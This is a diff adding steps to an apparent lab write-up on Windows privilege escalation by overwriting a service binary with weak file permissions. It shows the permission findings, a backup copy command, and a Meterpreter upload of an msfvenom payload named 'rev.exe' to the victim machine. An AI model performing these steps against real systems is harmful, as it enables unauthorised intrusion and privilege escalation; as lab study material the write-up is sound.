@@ -183,3 +183,41 @@ C:\Program Files\File Permissions Service\filepermservice.exe
 - `RW BUILTIN\Users — FILE_ALL_ACCESS`: Normal users have full control over the binary
 
 `FILE_ALL_ACCESS` for `Everyone` confirmed I could replace the real binary with my own payload.
+
+<p align="center">
+  <img src="images/step3-1.png" width="600">
+</p>
+
+## Step 4 — Backing Up the Original Service Binary
+
+Before replacing the real binary, I backed it up to `C:\temp` so I could restore it afterwards.
+
+```bash
+copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\temp
+```
+**Output:**
+
+```
+1 file(s) copied.
+```
+<p align="center">
+  <img src="images/step4-1.png" width="600">
+</p>
+
+## Step 5 — Uploading the Payload and Replacing the Service Binary
+
+### Uploaded rev.exe from Kali
+
+I alreay had a payload named `rev.exe` created by msfvenom. From kali, I uploaded this file on victim machine.
+
+```bash
+meterpreter > upload /home/kali/Desktop/rev.exe
+```
+```
+[*] Uploading  : /home/kali/Desktop/rev.exe -> rev.exe
+[*] Uploaded 7.50 KiB of 7.50 KiB (100.0%): /home/kali/Desktop/rev.exe -> rev.exe
+[*] Completed  : /home/kali/Desktop/rev.exe -> rev.exe
+```
+<p align="center">
+  <img src="images/step5-1.png" width="600">
+</p>
